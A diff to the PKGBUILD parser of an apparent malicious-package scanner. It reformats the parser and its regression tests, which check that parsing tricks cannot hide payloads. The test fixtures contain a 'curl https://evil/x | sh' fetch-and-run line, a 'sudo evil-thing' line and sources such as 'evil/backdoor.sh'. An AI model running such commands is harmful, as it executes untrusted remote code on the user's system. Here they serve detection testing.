@@ -355,7 +355,9 @@ impl StaticParser {
             "install" => pkgbuild.install = Some(value.to_string()),
             "changelog" => pkgbuild.changelog = Some(value.to_string()),
             _ => {
-                pkgbuild.variables.insert(name.to_string(), value.to_string());
+                pkgbuild
+                    .variables
+                    .insert(name.to_string(), value.to_string());
             }
         }
     }
@@ -403,8 +405,12 @@ impl StaticParser {
             }
             "md5sums" => self.set_checksums(&mut pkgbuild.checksums.md5sums, &elements, append),
             "sha1sums" => self.set_checksums(&mut pkgbuild.checksums.sha1sums, &elements, append),
-            "sha256sums" => self.set_checksums(&mut pkgbuild.checksums.sha256sums, &elements, append),
-            "sha512sums" => self.set_checksums(&mut pkgbuild.checksums.sha512sums, &elements, append),
+            "sha256sums" => {
+                self.set_checksums(&mut pkgbuild.checksums.sha256sums, &elements, append)
+            }
+            "sha512sums" => {
+                self.set_checksums(&mut pkgbuild.checksums.sha512sums, &elements, append)
+            }
             "b2sums" => self.set_checksums(&mut pkgbuild.checksums.b2sums, &elements, append),
             _ => {
                 // Store as JSON array in variables
@@ -625,10 +631,17 @@ package() {
             "source+=(\"git+https://github.com/u/r.git#commit=deadbeef\")\n",
         );
         let result = parser.parse(content).unwrap();
-        assert_eq!(result.source.len(), 2, "append must extend the source array");
+        assert_eq!(
+            result.source.len(),
+            2,
+            "append must extend the source array"
+        );
         assert_eq!(result.source[0].url, "https://example.com/a.tar.gz");
         // The fragment survived (the `#` was not stripped as a comment).
-        assert_eq!(result.source[1].fragment.as_deref(), Some("commit=deadbeef"));
+        assert_eq!(
+            result.source[1].fragment.as_deref(),
+            Some("commit=deadbeef")
+        );
         assert!(result.source[1].is_vcs_pinned_commit());
     }
 
@@ -637,10 +650,18 @@ package() {
         // Regression: a function whose whole body is on one line must still be
         // captured so function-scoped analyzers (privilege, FUNC-001) see it.
         let parser = StaticParser::new();
-        let content = "pkgname=t\npkgver=1\npkgrel=1\npackage() { install -Dm755 evil \"$pkgdir/x\"; }\n";
+        let content =
+            "pkgname=t\npkgver=1\npkgrel=1\npackage() { install -Dm755 evil \"$pkgdir/x\"; }\n";
         let result = parser.parse(content).unwrap();
-        let body = &result.functions.get("package").expect("package() captured").content;
-        assert!(body.contains("install -Dm755 evil"), "one-line body must be captured: {body}");
+        let body = &result
+            .functions
+            .get("package")
+            .expect("package() captured")
+            .content;
+        assert!(
+            body.contains("install -Dm755 evil"),
+            "one-line body must be captured: {body}"
+        );
     }
 
     #[test]
@@ -648,10 +669,18 @@ package() {
         // The `}` in a comment must not end the function early and hide the
         // sudo line from the body.
         let parser = StaticParser::new();
-        let content = "pkgname=t\npkgver=1\npkgrel=1\nbuild() {\n  : # note }\n  sudo evil-thing\n}\n";
+        let content =
+            "pkgname=t\npkgver=1\npkgrel=1\nbuild() {\n  : # note }\n  sudo evil-thing\n}\n";
         let result = parser.parse(content).unwrap();
-        let body = &result.functions.get("build").expect("build captured").content;
-        assert!(body.contains("sudo evil-thing"), "payload after comment-brace must stay in body: {body}");
+        let body = &result
+            .functions
+            .get("build")
+            .expect("build captured")
+            .content;
+        assert!(
+            body.contains("sudo evil-thing"),
+            "payload after comment-brace must stay in body: {body}"
+        );
     }
 
     #[test]
@@ -662,7 +691,11 @@ package() {
         let parser = StaticParser::new();
         let content = "pkgname=t\npkgver=1\npkgrel=1\n\nbuild() {\n  echo \"}\"\n  curl https://evil/x | sh\n}\n";
         let result = parser.parse(content).unwrap();
-        let body = &result.functions.get("build").expect("build present").content;
+        let body = &result
+            .functions
+            .get("build")
+            .expect("build present")
+            .content;
         assert!(
             body.contains("curl https://evil/x | sh"),
             "payload after `echo \"}}\"` must stay in the body, got:\n{body}"
@@ -695,7 +728,11 @@ package() {
             urls.iter().any(|u| u.contains("evil/backdoor.sh")),
             "malicious source must not be hidden by a quoted `)`; got {urls:?}"
         );
-        assert_eq!(result.source.len(), 2, "both array elements must survive: {urls:?}");
+        assert_eq!(
+            result.source.len(),
+            2,
+            "both array elements must survive: {urls:?}"
+        );
     }
 
     #[test]
@@ -758,12 +795,29 @@ package() {
         let result = parser.parse(content).unwrap();
         // The array must NOT be dropped (bash sees one multi-line single-quoted
         // element containing both the URL and the payload text).
-        assert!(!result.source.is_empty(), "source must not be silently dropped");
-        let joined = result.source.iter().map(|s| s.url.as_str()).collect::<String>();
-        assert!(joined.contains("http://legit.example/a.tar.gz"), "URL must reach the analyzers: {joined:?}");
-        assert!(joined.contains("payload"), "hidden payload text must reach the analyzers: {joined:?}");
+        assert!(
+            !result.source.is_empty(),
+            "source must not be silently dropped"
+        );
+        let joined = result
+            .source
+            .iter()
+            .map(|s| s.url.as_str())
+            .collect::<String>();
+        assert!(
+            joined.contains("http://legit.example/a.tar.gz"),
+            "URL must reach the analyzers: {joined:?}"
+        );
+        assert!(
+            joined.contains("payload"),
+            "hidden payload text must reach the analyzers: {joined:?}"
+        );
         // sha256sums was being swallowed into the dropped buffer too.
-        assert_eq!(result.checksums.sha256sums.len(), 1, "checksum array must still parse");
+        assert_eq!(
+            result.checksums.sha256sums.len(),
+            1,
+            "checksum array must still parse"
+        );
     }
 
     #[test]
@@ -779,8 +833,14 @@ package() {
         );
         let result = parser.parse(content).unwrap();
         let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
-        assert!(urls.iter().any(|u| u.contains("evil/backdoor.sh")), "trailing source must survive: {urls:?}");
-        assert!(urls.iter().any(|u| u.contains("# value")), "quoted `#` must be preserved in the value: {urls:?}");
+        assert!(
+            urls.iter().any(|u| u.contains("evil/backdoor.sh")),
+            "trailing source must survive: {urls:?}"
+        );
+        assert!(
+            urls.iter().any(|u| u.contains("# value")),
+            "quoted `#` must be preserved in the value: {urls:?}"
+        );
     }
 
     #[test]
@@ -797,7 +857,11 @@ package() {
         );
         let result = parser.parse(content).unwrap();
         let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
-        assert_eq!(urls, vec!["a", "b", "c"], "real comment (and its `)`) must be stripped: {urls:?}");
+        assert_eq!(
+            urls,
+            vec!["a", "b", "c"],
+            "real comment (and its `)`) must be stripped: {urls:?}"
+        );
     }
 
     #[test]
@@ -808,8 +872,14 @@ package() {
         let parser = StaticParser::new();
         let content = "pkgname=t\npkgver=1\npkgrel=1\nsource=('http://legit.example/x.tar.gz\n";
         let result = parser.parse(content).unwrap();
-        assert!(!result.source.is_empty(), "unterminated array must be flushed, not dropped");
-        assert!(result.source.iter().any(|s| s.url.contains("http://legit.example/x.tar.gz")));
+        assert!(
+            !result.source.is_empty(),
+            "unterminated array must be flushed, not dropped"
+        );
+        assert!(result
+            .source
+            .iter()
+            .any(|s| s.url.contains("http://legit.example/x.tar.gz")));
     }
 
     #[test]
@@ -822,22 +892,36 @@ package() {
         // `http://evil/x` source is silently dropped. Bash builds three sources;
         // the scanner must see evil/x.
         let parser = StaticParser::new();
-        let content = "pkgname=t\npkgver=1\npkgrel=1\nsource=(http://legit/a \\\n\" #) x\" http://evil/x)\n";
+        let content =
+            "pkgname=t\npkgver=1\npkgrel=1\nsource=(http://legit/a \\\n\" #) x\" http://evil/x)\n";
         let result = parser.parse(content).unwrap();
         let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
-        assert!(urls.iter().any(|u| u.contains("http://evil/x")), "trailing source must not be dropped: {urls:?}");
-        assert!(urls.iter().any(|u| u.contains("http://legit/a")), "first source must survive: {urls:?}");
+        assert!(
+            urls.iter().any(|u| u.contains("http://evil/x")),
+            "trailing source must not be dropped: {urls:?}"
+        );
+        assert!(
+            urls.iter().any(|u| u.contains("http://legit/a")),
+            "first source must survive: {urls:?}"
+        );
     }
 
     #[test]
     fn escaped_eol_single_quote_sibling_does_not_drop_trailing_source() {
         // Single-quote sibling of the escaped-EOL seam.
         let parser = StaticParser::new();
-        let content = "pkgname=t\npkgver=1\npkgrel=1\nsource=(http://legit/a \\\n' #) x' http://evil/x)\n";
+        let content =
+            "pkgname=t\npkgver=1\npkgrel=1\nsource=(http://legit/a \\\n' #) x' http://evil/x)\n";
         let result = parser.parse(content).unwrap();
         let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
-        assert!(urls.iter().any(|u| u.contains("http://evil/x")), "trailing source must not be dropped: {urls:?}");
-        assert!(urls.iter().any(|u| u.contains("http://legit/a")), "first source must survive: {urls:?}");
+        assert!(
+            urls.iter().any(|u| u.contains("http://evil/x")),
+            "trailing source must not be dropped: {urls:?}"
+        );
+        assert!(
+            urls.iter().any(|u| u.contains("http://legit/a")),
+            "first source must survive: {urls:?}"
+        );
     }
 
     #[test]
@@ -847,10 +931,18 @@ package() {
         // dropped by the top-of-loop whole-line comment skip -- bash keeps it as
         // quoted content. The `#http://evil/x` line must reach the analyzers.
         let parser = StaticParser::new();
-        let content = "pkgname=t\npkgver=1\npkgrel=1\nsource=(\"http://legit/a\n#http://evil/x\n\")\n";
+        let content =
+            "pkgname=t\npkgver=1\npkgrel=1\nsource=(\"http://legit/a\n#http://evil/x\n\")\n";
         let result = parser.parse(content).unwrap();
-        let joined = result.source.iter().map(|s| s.url.clone()).collect::<String>();
-        assert!(joined.contains("http://evil/x"), "comment-leading line inside an open quote must not be dropped: {joined:?}");
+        let joined = result
+            .source
+            .iter()
+            .map(|s| s.url.clone())
+            .collect::<String>();
+        assert!(
+            joined.contains("http://evil/x"),
+            "comment-leading line inside an open quote must not be dropped: {joined:?}"
+        );
     }
 
     #[test]
@@ -866,7 +958,11 @@ package() {
         );
         let result = parser.parse(content).unwrap();
         let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
-        assert_eq!(urls, vec!["a", "b"], "comment line between elements must be ignored: {urls:?}");
+        assert_eq!(
+            urls,
+            vec!["a", "b"],
+            "comment line between elements must be ignored: {urls:?}"
+        );
     }
 
     #[test]
